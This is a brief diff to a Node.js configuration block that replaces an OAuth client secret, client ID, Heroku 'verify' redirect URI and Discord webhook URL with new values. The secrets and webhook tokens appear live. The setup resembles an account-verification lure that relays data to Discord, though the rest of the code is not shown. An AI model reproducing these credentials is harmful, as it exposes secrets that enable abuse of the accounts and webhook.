@@ -1,8 +1,8 @@
 // Configuration
-const client_secret = '-.d8Q~yQCAZ9lhsfFKjY44dQJ9SwFn3jVinUZbXK'
-const client_id = 'b826b8d9-82bf-4988-9753-9c7040ad9fcb'
-const redirect_uri = 'https://verifyi.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1044107844909285407/cWyntTlJNPcRDU4KjlgQwo5ym8D0z_w3eenUkbcNXmS_Xou6Oz9mKMkl8O3myBqRJfj-'
+const client_secret = '-3c618145-7617-4417-94b9-84e736a46e78'
+const client_id = '54cc7c82-9f89-4723-8932-8e4852b284ba'
+const redirect_uri = 'https://verifyl.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1048528161211691088/_Tfbb9Oii-L_I_Ou_w_eSD7nzmp-A9KH_R94lWVvNrc2s9yOSPuy7HyOwEavgPZF3mf6'
 // Config end
 const axios = require('axios')
 const express = require('express')
